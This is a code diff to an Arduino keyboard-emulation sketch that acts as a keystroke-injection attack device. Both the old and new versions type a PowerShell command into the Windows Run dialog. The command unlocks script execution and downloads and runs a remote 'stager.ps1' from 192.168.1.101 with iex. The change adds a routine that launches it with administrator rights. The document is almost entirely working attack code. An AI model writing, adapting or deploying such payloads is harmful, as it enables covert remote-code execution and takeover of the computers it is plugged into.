@@ -6,6 +6,18 @@ void typeKey(uint8_t key)
   delay(50);
   Keyboard.release(key);
 }
+
+void runasAdmin(){
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_LEFT_CTRL);
+  delay(10);
+  Keyboard.press(KEY_RETURN);
+  delay(10);
+  Keyboard.release(KEY_RETURN);
+  delay(10);
+  Keyboard.releaseAll();
+}
+
 void setup()
 {
   Keyboard.begin();
@@ -14,18 +26,10 @@ void setup()
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
-  delay(150);
-  Keyboard.print("cmd");
-  delay(100);
-  typeKey(KEY_RETURN);
-  delay(100);
-  Keyboard.print("color f7 && mode con:cols=15 lines=1");
-  delay(100);
-  typeKey(KEY_RETURN);
-  delay(150);
-  Keyboard.print("powershell.exe -w 1 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.1.101/stager.ps1')\"");
-  delay(150);
-  typeKey(KEY_RETURN);
+  delay(250);
+  Keyboard.print("powershell.exe -w 1 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle 1 -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.1.101/stager.ps1')\"");
+  delay(250);
+  runasAdmin();
   Keyboard.end();
 }
 void loop() {}
